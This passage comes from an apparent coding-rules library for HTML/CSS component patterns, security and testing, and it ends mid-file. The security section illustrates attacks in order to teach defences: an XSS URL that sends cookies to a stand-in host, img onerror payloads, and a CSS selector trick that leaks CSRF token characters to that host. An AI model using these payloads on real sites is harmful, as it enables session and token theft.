  .card__link-overlay::after {
    content: "";
    position: absolute;
    inset: 0;
  }
</style>
```

The `::after` pseudo-element makes the entire card clickable
while keeping the semantic anchor.

### Anti-pattern 6: CSS-in-JS without static extraction

Runtime CSS-in-JS (styled-components, emotion in some configs)
inflates JS bundle + slows first paint. Modern alternatives
extract CSS at build time:

- vanilla-extract (TypeScript-safe, build-time extracted)
- Linaria (CSS-in-JS with zero runtime)
- Panda CSS (static, build-time)
- StyleX (Meta's, static)
- CSS Modules (most boring, most predictable)

Per `common/reuse-first.md` — pick one and stick.

### Anti-pattern 7: Custom checkbox / radio that breaks keyboard

```html
<!-- WRONG — visually-styled div as checkbox -->
<div class="checkbox" data-checked="false" onclick="toggle(this)">…</div>

<!-- RIGHT — native input visually styled via CSS -->
<label class="checkbox">
  <input type="checkbox" name="agree" required />
  <span class="checkbox__mark" aria-hidden="true"></span>
  <span class="checkbox__label">I agree to the terms</span>
</label>

<style>
  .checkbox input[type="checkbox"] {
    position: absolute;
    opacity: 0;
    inline-size: 1px;
    block-size: 1px;
  }
  .checkbox__mark { /* styled visually */ }
  .checkbox input:focus-visible + .checkbox__mark {
    outline: 2px solid var(--color-focus-ring);
  }
  .checkbox input:checked + .checkbox__mark::before {
    content: "";
    /* checkmark */
  }
</style>
```

The hidden native input keeps every form / a11y / autofill /
spellcheck behaviour intact.

## Reuse-first libraries

| Use case | Library |
| --- | --- |
| Accessible components (React) | React Aria, Radix UI, Headless UI |
| Accessible components (Vue) | Reka UI, Vuetensils |
| Accessible components (Svelte) | Bits UI, Melt UI |
| Accessible components (Solid) | Kobalte |
| Accessible components (vanilla) | Web Awesome (Shoelace), Material Web |
| CSS reset | modern-normalize, the new CSS reset (Josh W Comeau) |
| Layout primitives | Every Layout (paste-in CSS) |
| Form validation | Zod + react-hook-form / VeeValidate / Felte / Conform |
| Icons | Lucide, Heroicons, Phosphor Icons, Tabler Icons |
| Animation | Motion (was Framer Motion), GSAP, View Transitions API |
| Charts | D3 (low-level), Visx, Recharts, ECharts, Plot |
| Code highlighting | Shiki (build-time), highlight.js (runtime) |
| Markdown rendering | MDX (React/JS), unified/remark + rehype |
| Date/time picker | react-aria-components, react-day-picker, Cally web component |

Per [`common/reuse-first.md`](../../rules-library/common/reuse-first.md) — sweep
before building.

## Cross-references

- [`html-css/coding-style.md`](../../rules-library/html-css/coding-style.md) — naming +
  semantic HTML + tokens
- [`html-css/security.md`](../../rules-library/html-css/security.md) — CSP + XSS + form
  hardening
- [`html-css/testing.md`](../../rules-library/html-css/testing.md) — visual regression +
  axe-core + Playwright
- [`html-css/hooks.md`](../../rules-library/html-css/hooks.md) — stylelint + htmlhint + CI
- [`common/a11y.md`](../../rules-library/common/a11y.md) — WCAG 2.2 mandates
- [`common/i18n.md`](../../rules-library/common/i18n.md) — RTL + locale-aware
- [`common/patterns.md`](../../rules-library/common/patterns.md) — broader
  architectural patterns (response envelope, etc.)
- [`common/reuse-first.md`](../../rules-library/common/reuse-first.md) — extract
  on second occurrence; never fork primitives
- [`typescript/coding-style.md`](../../rules-library/typescript/coding-style.md)
  — React 19 + Vue 3 idioms
- frontend-patterns skill (auto-activates for `.vue` / `.tsx` /
  `.jsx`) — visual design quality

## Why this rule exists

Modern web UI is component-shaped; without a pattern catalog,
each component re-invents accessibility from scratch and gets
~80% of it right. The 20% is the part screen-reader users hit
first. The patterns above are the WAI-ARIA APG codified plus
the modern CSS architecture choices (CSS Custom Properties,
layout primitives, Cascade Layers) that have proven durable
across 2024-2026 frontends.

Recurring incidents averted:

- Modal that traps keyboard focus inside but never returns it
  to the trigger on close (Pattern 7 — `<dialog>` close listener)
- Form validation that announces every keystroke and exhausts
  screen-reader users (Pattern 6 — blur-triggered)
- Token mismatch between light + dark mode because raw colours
  were used in components (Pattern 1 — semantic tier)
- Container that breaks at unexpected viewport widths because
  responsive design used `min-width` instead of container
  queries (Pattern 4)

## Learning hooks

Per [`common/continuous-learning-mandate.md`](../../rules/common/continuous-learning-mandate.md):

**Signals to watch**:

- New interactive component shipped without an APG-aligned
  keyboard model (Pattern 3 weakening)
- Raw colour literal in a component file (Pattern 1 tier
  bypass)
- `<dialog>` not used when shipping a modal in a modern target
  browser matrix (Pattern 7 — re-implementing focus trap)
- `style=` attribute introduced in HTML (Anti-pattern 3)
- `tabindex > 0` shipped (Anti-pattern 4)
- Click handler on `<div>` / `<span>` for action that should
  be `<button>` (Anti-pattern 5 — rule 1 from coding-style)
- Multiple CSS architectures mixed in one project (CUBE plus BEM
  plus utilities) — architectural drift

**Refinement candidates**:

- New layout-primitive row when a recurring composition pattern
  emerges (e.g., Switcher, Reel, Imposter)
- New library row when a maintained accessible-component
  library gains adoption
- Tightening of the token-tier separation when leakage between
  primitive + semantic recurs
- New cross-reference when a sister rule (a11y, frontend-patterns
  skill) prescribes a complementary contract

---

<!-- ============================================================
     Section: html-css/security.md
     ============================================================ -->

# HTML / CSS Security

> Auto-fires on every `*.html`, `*.css`, `*.scss`, `*.module.css`,
> CSP header config, `meta name="referrer"` declarations,
> `<iframe>` / `<form>` / `<a target>` patterns. Standards:
> **OWASP Top 10 — A03 Injection (XSS)**, **OWASP Cross-Site
> Scripting Cheat Sheet**, **OWASP HTML5 Security Cheat Sheet**,
> **Content Security Policy Level 3 (CSP3, W3C)**, **Subresource
> Integrity (SRI, W3C)**, **Trusted Types (W3C)**, **HTML Living
> Standard §sandboxing** (iframe sandbox), **Referrer-Policy
> (W3C)**, **Permissions Policy (W3C)**, **Cross-Origin Opener /
> Embedder / Resource Policy (Fetch Living Standard)**.

## Core Principle

**Every HTML + CSS surface is an XSS target until it isn't. The
default posture is: text content over innerHTML, framework-
escaped templates (never raw concatenation), Trusted Types
mandatory for any `innerHTML`-equivalent sink, strict
Content-Security-Policy with nonces (not unsafe-inline), SRI on
every external resource, sandbox on every iframe that loads
third-party content, modern cross-origin isolation headers
(COOP / COEP / CORP).**

## OWASP Top 10 alignment

### A03 — Injection (Cross-Site Scripting)

The single most-impactful HTML attack vector. Three classes:

#### Reflected XSS

```html
<!-- WRONG — user-supplied query echoed into the DOM unescaped -->
<h1>Search results for: <%= request.query.q %></h1>

<!-- Attacker URL: /search?q=<script>fetch('//evil.example/'+document.cookie)</script> -->
```

#### Stored XSS

```html
<!-- WRONG — comment body rendered without escaping -->
<div class="comment">{{ comment.body | safe }}</div>

<!-- Attacker comment body: <img src=x onerror=...> -->
```

#### DOM-based XSS

```javascript
// WRONG — user input flows to a sink that executes
document.getElementById('greeting').innerHTML = location.hash.slice(1);

// Attacker URL: #<img src=x onerror=...>
```

Mitigation hierarchy (apply ALL):

1. **Framework escaping** — React, Vue, Svelte, Angular, Solid
   all escape by default. NEVER use the "escape hatch" (React
   `dangerouslySetInnerHTML`, Vue `v-html`, Svelte `{@html}`,
   Angular `[innerHTML]`) without a sanitiser.

2. **DOMPurify (or equivalent)** for HTML that must come from
   user content (rich-text editors, markdown rendering):

   ```javascript
   import DOMPurify from 'dompurify';
   element.innerHTML = DOMPurify.sanitize(userInput, {
     ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'li'],
     ALLOWED_ATTR: ['href'],
     ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|\/)/i,
   });
   ```

3. **Trusted Types** — enforce ALL `innerHTML`-equivalent
   sinks accept ONLY Trusted-Type-wrapped values (browser-level
   blockade on string assignments):

   ```http
   Content-Security-Policy: require-trusted-types-for 'script';
                            trusted-types my-policy default;
   ```

   ```javascript
   const policy = window.trustedTypes.createPolicy('my-policy', {
     createHTML: (input) => DOMPurify.sanitize(input),
   });
   element.innerHTML = policy.createHTML(userInput);
   ```

4. **Output encoding** — context-aware: HTML body, HTML
   attribute, JavaScript, CSS, URL. The framework usually
   handles this; custom server-side rendering must apply per-
   context.

### A05 — Security Misconfiguration

#### Strict Content-Security-Policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_BASE64}' 'strict-dynamic';
  style-src 'self' 'nonce-{RANDOM_BASE64}';
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri /csp-violation-report;
  require-trusted-types-for 'script';
  trusted-types my-policy default;
```

Notes:

- `nonce-` uses a per-request crypto-random value (16+ bytes,
  base64-encoded) embedded as `<script nonce="...">`. The nonce
  changes every request.
- `'strict-dynamic'` lets a nonce-loaded script load further
  scripts without listing each origin (avoids hosts allowlists
  going stale).
- `object-src 'none'` blocks `<object>` / `<embed>` / `<applet>`.
- `base-uri 'none'` blocks `<base href>` injection (attack
  vector for rebasing relative URLs).
- `frame-ancestors 'none'` prevents being framed (replaces
  `X-Frame-Options: DENY`).
- `form-action 'self'` restricts form submission targets.
- `report-uri` (or `report-to` for the newer reporting API)
  collects violations.

**Bad CSP shapes to avoid**:

```http
# DON'T — defeats CSP entirely
script-src * 'unsafe-inline' 'unsafe-eval';

# DON'T — allows any HTTPS source
script-src https:;

# DON'T — overly broad allowlist
script-src 'self' https://cdn.jsdelivr.net https://*.googleapis.com;

# DO — nonce + strict-dynamic
script-src 'self' 'nonce-{RANDOM}' 'strict-dynamic';
```

#### Subresource Integrity

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

`integrity` is computed by:

```bash
shasum -b -a 384 lib.js | awk '{print $1}' | xxd -r -p | base64
```

CI verifies the SRI hash matches the bundled file (per
[`common/dependency-pinning.md`](../../rules-library/common/dependency-pinning.md)).

#### Modern security headers

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=(),
                    payment=(self), fullscreen=(self)
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

`X-Frame-Options` is superseded by CSP `frame-ancestors`.
`X-XSS-Protection` is deprecated (modern browsers ignore).

### A07 — Identification + Authentication

#### Forms

```html
<form method="post" action="/login" autocomplete="on">
  <input
    type="email"
    name="email"
    autocomplete="username"
    required
    inputmode="email"
    spellcheck="false"
    autocorrect="off"
  />
  <input
    type="password"
    name="password"
    autocomplete="current-password"
    required
    minlength="12"
  />
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
  <button type="submit">Sign in</button>
</form>
```

- `autocomplete` values from
  [WHATWG autofill](https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#autofill)
  — `username`, `current-password`, `new-password`, `one-time-code`,
  `cc-number`, `cc-csc`, etc. Password managers depend on these.
- CSRF token always present on state-changing forms (per
  framework's CSRF middleware).
- `type="password"` browser-prevents autocomplete leaks.

#### One-time-code inputs

```html
<input
  type="text"
  inputmode="numeric"
  pattern="[0-9]*"
  maxlength="6"
  autocomplete="one-time-code"
  name="otp"
/>
```

iOS Safari auto-fills SMS codes when `autocomplete="one-time-code"`.

### A08 — Software / Data Integrity

#### Iframes — sandbox by default

```html
<!-- User-generated content / third-party widget -->
<iframe
  src="https://widget.example.com"
  sandbox="allow-scripts allow-forms"
  loading="lazy"
  title="Widget description"
></iframe>
```

`sandbox` (empty) is the strictest — disables scripts, forms,
plugins, top-navigation, popups. Grant capabilities back
explicitly. NEVER `sandbox="allow-scripts allow-same-origin"` on
iframes pointing at a different origin — the combination defeats
the sandbox.

#### External links

```html
<a href="https://external.example.com" target="_blank" rel="noopener noreferrer">
  External site
</a>
```

`rel="noopener"` prevents the new window from accessing
`window.opener` (reverse-tabnabbing prevention). Modern browsers
imply this for `target="_blank"`, but explicit is defensive.

### A10 — SSRF (indirect via HTML)

User-supplied URLs that the server fetches (image proxy, link
previewer, OG-tag generator) need server-side allowlist + IP
range validation. Per [`common/security.md`](../../rules-library/common/security.md)
A10.

## CSS-specific security

### CSS injection via attribute selectors

```css
/* Attack: query CSRF tokens character-by-character */
input[name="csrf_token"][value^="a"] {
  background: url('//evil.example/leak?c=a');
}
input[name="csrf_token"][value^="b"] {
  background: url('//evil.example/leak?c=b');
}
/* … 26 rules per character position … */
```

The CSS rule fires when the attribute matches; the URL fetch
leaks the prefix. Mitigations:

- Strict CSP (`style-src 'self' 'nonce-{...}'`) blocks injected
  styles.
- Tokens never live in HTML attribute values that user-supplied
  CSS could read; prefer hidden inputs that aren't selectable
  by attribute prefix.
- For form CSRF tokens, server-side validation is the real
  defence; the CSS exfiltration is a side-channel.

### CSS-driven phishing via `:visited` history sniffing

Modern browsers limit which properties `:visited` can affect
(only colour, NOT layout / background-image). The historical
attack is largely fenced; still: don't expose user-controlled
URLs in `:visited` styles.

### `expression()` in IE-era CSS

```css
/* HISTORICAL — IE expression() executed JavaScript */
width: expression(alert('xss'));
```

IE is no longer a target browser (per `extreme-lint-policy.md`).
Modern browsers ignore `expression()`. Mentioned for legacy
auditing.

### Imported stylesheets

```css
/* Each @import is an extra HTTP request */
@import url("https://fonts.googleapis.com/css2?family=Inter");
```

`@import` from a different origin:

- Slower (blocks rendering until fetched).
- CSP `style-src` must include the source.
- SRI not supported on `@import` (CSP nonce on a `<link>` is
  the modern path).

Prefer `<link rel="stylesheet" href="..." integrity="...">` with
SRI over `@import`.

## Form security hardening

### Per-form checklist

- [ ] `method="post"` on state-changing forms (never GET)
- [ ] CSRF token included (framework middleware)
- [ ] `autocomplete` values correct per WHATWG
- [ ] `required` + server-side validation (NEVER client-only)
- [ ] `enctype="multipart/form-data"` for file uploads + server
      size + type validation
- [ ] `inputmode` + `pattern` + `maxlength` to constrain input
- [ ] `accept=".pdf,.jpg"` on `<input type="file">` (UX hint,
      NOT a security boundary)
- [ ] Honeypot field (hidden via CSS, server rejects if filled)
      for bot mitigation OR proper bot management (Turnstile,
      hCaptcha, reCAPTCHA)
- [ ] Rate limit on form-submission endpoint (per
      [`common/rate-limiting.md`](../../rules-library/common/rate-limiting.md))

## File upload security

```html
<form method="post" action="/upload" enctype="multipart/form-data">
  <input
    type="file"
    name="avatar"
    accept="image/jpeg,image/png,image/webp"
    required
  />
  <button type="submit">Upload</button>
</form>
```

`accept` is UI-only — server MUST validate:

1. File size (HTTP body size limit at the proxy + per-request
   max in the framework).
2. Magic number / content type (not the extension).
3. Re-encode images server-side (strip EXIF; strip embedded JS
   in SVG).
4. Store with random server-generated filename.
5. Serve from a separate origin or a `Content-Disposition:
   attachment` header for non-image files.

## Inline event handlers — banned

```html
<!-- WRONG — defeats CSP nonce-based protection -->
<button onclick="submit()">Submit</button>

<!-- RIGHT — externalize -->
<button id="submit-btn">Submit</button>
<script nonce="{{ csp_nonce }}">
  document.getElementById('submit-btn').addEventListener('click', submit);
</script>
```

HTMLHint `inline-script-disabled` + CSP `script-src` without
`'unsafe-inline'` enforces.

## Required tooling

```bash
# CSP analysis
csp-evaluator-cli site.example.com
# Or browser DevTools → Lighthouse → Best Practices

# Security headers scan
curl -I https://site.example.com
# Or run securityheaders.com analyser

# HTML scan
htmlhint src/**/*.html

# CSS scan
stylelint 'src/**/*.css'

# Static security analyser (SAST)
semgrep --config p/owasp-top-ten src/

# Subresource Integrity hash generator
openssl dgst -sha384 -binary lib.js | openssl base64 -A
```

## Cross-references

- [`html-css/coding-style.md`](../../rules-library/html-css/coding-style.md) — semantic
  HTML + no inline styles
- [`html-css/patterns.md`](../../rules-library/html-css/patterns.md) — accessible component
  patterns + `<dialog>` + Trusted Types
- [`html-css/testing.md`](../../rules-library/html-css/testing.md) — axe + security tests
- [`html-css/hooks.md`](../../rules-library/html-css/hooks.md) — stylelint + htmlhint + CI
- [`common/security.md`](../../rules-library/common/security.md) — OWASP Top 10
  umbrella
- [`common/secrets-management.md`](../../rules-library/common/secrets-management.md)
  — no inlined secrets
- [`common/dependency-pinning.md`](../../rules-library/common/dependency-pinning.md)
  — SRI on external resources
- [`common/rate-limiting.md`](../../rules-library/common/rate-limiting.md) — form
  submission limits
- [`common/audit-logging.md`](../../rules-library/common/audit-logging.md) —
  security events (login, CSP violations)
- [`typescript/security.md`](../../rules-library/typescript/security.md) —
  framework-side XSS prevention (React, Vue, Svelte)

## Why this rule exists

XSS continues to top OWASP web rankings year after year despite
framework-level protections, because the escape hatches
(`dangerouslySetInnerHTML`, `v-html`, `{@html}`) get used. CSP +
Trusted Types provide DEFENCE IN DEPTH so a single framework-
escape-hatch slip doesn't become an account-takeover. The CSP
nonce + `strict-dynamic` pattern survives the lifetime of a
project; allowlist-based CSPs decay (every new CDN, every new
analytics provider, every campaign script tempts widening the
allowlist).

The browser-side controls in this file are the floor. The
server-side authentication / authorisation controls live in
[`common/security.md`](../../rules-library/common/security.md) + framework-
specific files. Both are required.

## Learning hooks

Per [`common/continuous-learning-mandate.md`](../../rules/common/continuous-learning-mandate.md):

**Signals to watch**:

- CSP missing or weakened (`'unsafe-inline'` / `'unsafe-eval'` /
  wildcard origin) — rule §A05 violation
- `dangerouslySetInnerHTML` / `v-html` / `{@html}` shipped
  without a sanitiser (rule §A03 weakening)
- `<iframe>` without `sandbox` loading user-controlled URL
  (rule §A08)
- External `<script>` / `<link>` without `integrity=` attribute
  (rule §A08 — SRI weakening)
- Inline event handler (`onclick="..."`, `onload="..."`) shipped
  (CSP defeated)
- Form `method="get"` for state-changing action (security weak)
- Modern security header missing on a new route (HSTS / COOP /
  COEP / Permissions-Policy)
- Trusted Types policy not enforced when CSP supports it
- `:visited` exposed in a way that could be inferred — rare but
  worth grep

**Refinement candidates**:

- New CSP directive when a browser ships a new gate (e.g.,
  Document-Policy, Origin-Agent-Cluster)
- New iframe-pattern row when a recurring third-party widget
  needs documented sandbox profile
- New sanitiser allow-list when a recurring rich-text content
  type emerges
- Tightening of the SRI requirement when supply-chain
  retargeting incidents surface

---

<!-- ============================================================
     Section: html-css/testing.md
     ============================================================ -->

# HTML / CSS Testing

> Auto-fires on every `*.html`, `*.css`, `*.test.{ts,tsx,jsx,js}`,
> `*.spec.{ts,tsx,jsx,js}`, `*.e2e.{ts,tsx,jsx,js}`,
> `*.stories.{ts,tsx,jsx,js}`, `playwright.config.*`,
> `cypress.config.*` file. Standards: **W3C Web Platform Tests**,
> **axe-core 4.x** (Deque), **Pa11y**, **Playwright** (current),
> **Vitest** / **Jest** for component tests, **Testing Library**
> family (React / Vue / Svelte / DOM), **Lighthouse**, **Chrome
> User Experience Report**, **Core Web Vitals**.

## Core Principle

**Frontend testing is layered: unit tests verify component
behaviour in isolation; visual regression catches CSS drift;
accessibility tests gate WCAG 2.2 AA at PR time; E2E tests
verify the critical user journeys end-to-end against a real
browser. Every interactive component ships with a keyboard test,
a screen-reader-friendly assertion, and a visual snapshot.
Coverage isn't a number — it's "did we test the keyboard path,
the error path, the empty state, and the reduced-motion path?"**

## The frontend testing pyramid

| Layer | Tool | Coverage scope |
| --- | --- | --- |
| **Unit** (DOM + component logic) | Vitest / Jest + Testing Library | Render output; user events; reducer / hook logic |
| **Accessibility** (axe-core) | axe-core / pa11y / @axe-core/playwright | WCAG 2.2 AA violations |
| **Visual regression** | Chromatic / Percy / Playwright snapshot / Storybook test runner | Pixel + DOM diff per component / story |
| **Storybook interactions** | @storybook/test (Vitest-based) | Component behaviour in dev environment |
| **E2E** (browser) | Playwright / Cypress / WebdriverIO | Critical user journeys |
| **Performance** | Lighthouse CI / WebPageTest | Core Web Vitals; bundle size |
| **Cross-browser matrix** | Playwright with multiple `projects` | Chromium / Firefox / WebKit |
| **Real-device** | BrowserStack / SauceLabs / Lambda Test | Critical paths on iOS Safari / Android Chrome |

Per [`common/testing.md`](../../rules-library/common/testing.md) — the unit
floor is 90% touched / 80% project. The other layers are
journey-scoped, not coverage-scoped.

## Hard rules

### 1. Testing Library, not Enzyme / `wrapper.find('div.foo')`

Testing Library queries by ROLE, LABEL, TEXT — what a user (or
screen reader) sees:

```typescript
// WRONG — implementation-coupled
expect(wrapper.find('.btn-primary').text()).toBe('Submit');

// RIGHT — user-facing
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('submits the form', async () => {
  const user = userEvent.setup();
  const handleSubmit = vi.fn();
  render(<LoginForm onSubmit={handleSubmit} />);

  await user.type(screen.getByLabelText(/email/i), 'alice@example.com');
  await user.type(screen.getByLabelText(/password/i), 'supersecret');
  await user.click(screen.getByRole('button', { name: /sign in/i }));

  expect(handleSubmit).toHaveBeenCalledWith({
    email: 'alice@example.com',
    password: 'supersecret',
  });
});
```

Query priority (Testing Library docs):

1. `getByRole` — what assistive tech sees
2. `getByLabelText` — forms
3. `getByPlaceholderText` — fallback when no label exists (note:
   placeholder as label is an a11y violation per coding-style.md
   rule 3)
4. `getByText` — non-interactive content
5. `getByDisplayValue` — form value
6. `getByAltText` — images
7. `getByTitle`
8. `getByTestId` — LAST RESORT; surface a real label instead

`getByTestId` is an escape hatch; using it more than once per
component file usually indicates missing semantic HTML.

### 2. Test the keyboard path

```typescript
test('disclosure expands on Enter + Space; closes on Escape', async () => {
  const user = userEvent.setup();
  render(<Disclosure summary="What's included?">Details here</Disclosure>);

  const trigger = screen.getByRole('button', { name: /what's included/i });
  trigger.focus();
  expect(trigger).toHaveFocus();

  await user.keyboard('{Enter}');
  expect(screen.getByText('Details here')).toBeVisible();
  expect(trigger).toHaveAttribute('aria-expanded', 'true');

  await user.keyboard('{Space}');
  expect(screen.queryByText('Details here')).not.toBeVisible();

  await user.keyboard('{Enter}');
  expect(screen.getByText('Details here')).toBeVisible();
  await user.keyboard('{Escape}');
  expect(screen.queryByText('Details here')).not.toBeVisible();
});
```

Per [`common/a11y.md`](../../rules-library/common/a11y.md) — every interactive
component has a keyboard test.

### 3. Test the error + empty + loading state

```typescript
describe('OrderList', () => {
  test('loading state announces "Loading orders"', () => {
    render(<OrderList status="loading" orders={[]} />);
    expect(screen.getByRole('status')).toHaveTextContent(/loading orders/i);
  });

  test('empty state renders the CTA', () => {
    render(<OrderList status="success" orders={[]} />);
    expect(screen.getByText(/no orders yet/i)).toBeInTheDocument();
    expect(screen.getByRole('link', { name: /shop now/i })).toBeInTheDocument();
  });

  test('error state announces the failure + retry button', () => {
    const onRetry = vi.fn();
    render(<OrderList status="error" errorCode="orders_fetch_failed" onRetry={onRetry} />);
    const alert = screen.getByRole('alert');
    expect(alert).toHaveTextContent(/couldn't load orders/i);
    fireEvent.click(screen.getByRole('button', { name: /try again/i }));
    expect(onRetry).toHaveBeenCalled();
  });

  test('reduced-motion respected', () => {
    // userMediaQuery emulates prefers-reduced-motion
    setReducedMotion(true);
    render(<OrderList status="loading" orders={[]} />);
    const skeleton = screen.getByTestId('order-list-skeleton');
    expect(window.getComputedStyle(skeleton).animationDuration).toBe('0.01ms');
  });
});
```

Per [`common/error-codes.md`](../../rules-library/common/error-codes.md) — the
test asserts on the `error_code` mapping, not the copy.

### 4. axe-core in unit + E2E

```typescript
// Component-level axe assertion (Vitest + jest-axe)
import { axe, toHaveNoViolations } from 'jest-axe';
expect.extend({ toHaveNoViolations });

test('LoginForm has no a11y violations', async () => {
  const { container } = render(<LoginForm />);
  const results = await axe(container);
  expect(results).toHaveNoViolations();
});
```

```typescript
// Playwright E2E axe scan
import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

test('login page passes axe scan', async ({ page }) => {
  await page.goto('/login');
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag22aa'])
    .analyze();
  expect(results.violations).toEqual([]);
});
```

Run axe in BOTH layers:

- Component-level catches violations early (per-component
  scope, faster feedback)
- E2E-level catches integration violations (e.g., colour
  contrast against a theme the component doesn't know about)

### 5. Visual regression on every component + story

Storybook + Chromatic / Percy / Playwright snapshot is the
de-facto standard:

```typescript
// Button.stories.tsx
import type { Meta, StoryObj } from '@storybook/react';
import { Button } from './Button';

const meta: Meta<typeof Button> = {
  component: Button,
  parameters: {
    chromatic: {
      modes: {
        'light-mobile': { viewport: { width: 375 }, theme: 'light' },
        'light-desktop': { viewport: { width: 1280 }, theme: 'light' },
        'dark-desktop': { viewport: { width: 1280 }, theme: 'dark' },
        'reduced-motion': { motion: 'reduce' },
      },
    },
  },
};

export default meta;

export const Primary: StoryObj<typeof Button> = {
  args: { variant: 'primary', children: 'Sign in' },
};

export const PrimaryWithIcon: StoryObj<typeof Button> = {
  args: { variant: 'primary', leadingIcon: 'arrow-right', children: 'Continue' },
};

export const Loading: StoryObj<typeof Button> = {
  args: { variant: 'primary', loading: true, children: 'Signing in' },
};

export const Disabled: StoryObj<typeof Button> = {
  args: { variant: 'primary', disabled: true, children: 'Sign in' },
};
```

Every story is one visual-regression test. Chromatic / Percy
diff against the baseline; CI fails if pixels change.

### 6. E2E covers the critical user journey

```typescript
// e2e/checkout.spec.ts
test('shopper completes checkout end-to-end', async ({ page }) => {
  await page.goto('/');
  await page.getByRole('link', { name: /shop now/i }).click();

  await page.getByRole('button', { name: /add to cart/i }).click();
  await expect(page.getByRole('status')).toContainText(/added to cart/i);

  await page.getByRole('link', { name: /cart/i }).click();
  await expect(page).toHaveURL(/\/cart/);

  await page.getByRole('button', { name: /checkout/i }).click();
  await page.getByLabel('Email').fill('shopper@example.com');
  await page.getByLabel('Card number').fill('4242 4242 4242 4242');
  // … rest of payment flow with test cards …

  await page.getByRole('button', { name: /place order/i }).click();
  await expect(page.getByRole('heading', { name: /order confirmed/i })).toBeVisible();

  // Assert no a11y violations on the confirmation
  const results = await new AxeBuilder({ page }).analyze();
  expect(results.violations).toEqual([]);
});
```

Critical journeys per project: signup, login, primary
conversion (checkout / submit / publish), account deletion,
core admin task.

### 7. Cross-browser matrix in CI

Playwright `playwright.config.ts`:

```typescript
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'firefox', use: { ...devices['Desktop Firefox'] } },
    { name: 'webkit', use: { ...devices['Desktop Safari'] } },
    { name: 'mobile-chrome', use: { ...devices['Pixel 7'] } },
    { name: 'mobile-safari', use: { ...devices['iPhone 14'] } },
  ],
  retries: 2,
  workers: process.env.CI ? 4 : undefined,
  reporter: [
    ['list'],
    ['html', { open: 'never' }],
    ['github'],
  ],
});
```

CI runs all 5 projects; failures attach video + trace artefacts
per [`common/local-dev-setup.md`](../../rules-library/common/local-dev-setup.md).

### 8. Performance budget gates

Lighthouse CI configuration:

```jsonc
// .lighthouserc.json
{
  "ci": {
    "collect": {
      "url": ["http://localhost:3000", "http://localhost:3000/checkout"],
      "numberOfRuns": 3
    },
    "assert": {
      "assertions": {
        "categories:performance": ["error", { "minScore": 0.9 }],
        "categories:accessibility": ["error", { "minScore": 1 }],
        "categories:best-practices": ["error", { "minScore": 0.95 }],
        "categories:seo": ["error", { "minScore": 0.95 }],
        "first-contentful-paint": ["error", { "maxNumericValue": 1800 }],
        "largest-contentful-paint": ["error", { "maxNumericValue": 2500 }],
        "cumulative-layout-shift": ["error", { "maxNumericValue": 0.1 }],
        "total-blocking-time": ["error", { "maxNumericValue": 200 }],
        "interaction-to-next-paint": ["error", { "maxNumericValue": 200 }]
      }
    }
  }
}
```

LCP < 2.5s, INP < 200ms, CLS < 0.1 — Core Web Vitals "Good"
thresholds.

### 9. Bundle size budget

```jsonc
// size-limit config in package.json
{
  "size-limit": [
    { "name": "main bundle", "path": "dist/main.*.js", "limit": "150 KB" },
    { "name": "main CSS", "path": "dist/main.*.css", "limit": "50 KB" },
    { "name": "route /checkout", "path": "dist/route-checkout.*.js", "limit": "60 KB" }
  ]
}
```

CI runs `pnpm size-limit` (or `bundlewatch`); regressing a
budget by > N% fails the build.

### 10. Mutation testing for critical logic

`Stryker Mutator` (stryker-js) mutates source + runs tests;
tests that don't catch mutations are weak.

```bash
pnpm stryker run
```

Critical-path logic targets ≥ 70% mutation score; surface UI
targets are exempt (component test coverage handles it).

## What NOT to do

### Anti-pattern 1: Snapshot tests instead of behaviour tests

Jest / Vitest `toMatchSnapshot()` on a giant DOM tree is
brittle and meaningless. Snapshots that the team blindly
regenerates with `--update-snapshots` are no test at all.

Reserve snapshots for:

- Small, stable data shapes (error envelopes, formatters)
- Rendered email HTML (transactional templates)

For UI, use behaviour tests + visual regression instead.

### Anti-pattern 2: Testing private implementation details

```typescript
// WRONG — tests internal state
expect(component.state.activeTab).toBe(1);

// RIGHT — tests user-visible behaviour
expect(screen.getByRole('tab', { name: /details/i })).toHaveAttribute(
  'aria-selected',
  'true',
);
```

Implementation details change; user contract doesn't.

### Anti-pattern 3: 100% coverage from `it.todo`

```typescript
// USELESS
test.todo('handles error state');
test.todo('handles empty state');
```

`it.todo` shows in the test report as a not-implemented test.
Either implement it or remove the placeholder.

### Anti-pattern 4: E2E flakes silenced via `await page.waitForTimeout(...)`

```typescript
// WRONG — fixed sleep masks the real timing issue
await page.click('#submit');
await page.waitForTimeout(2000);
await expect(page.getByText('Confirmed')).toBeVisible();

// RIGHT — wait for the actual signal
await page.click('#submit');
await expect(page.getByText('Confirmed')).toBeVisible();
// (Playwright auto-waits for the element to appear)
```

Flake-suppressing sleeps slow tests + hide real regressions
that surface as intermittent failures under load.

### Anti-pattern 5: Mocked browser APIs that diverge from real ones

```typescript
// jsdom doesn't implement IntersectionObserver — common mock
beforeEach(() => {
  global.IntersectionObserver = vi.fn(() => ({
    observe: vi.fn(),
    disconnect: vi.fn(),
  }));
});
```

If your tests rely on mocked-out browser APIs, run the SAME
tests as a Playwright E2E to confirm the real browser behaviour
matches. Mocking + reality divergence is a class of bug
component tests can't catch.

## Required tooling

```bash
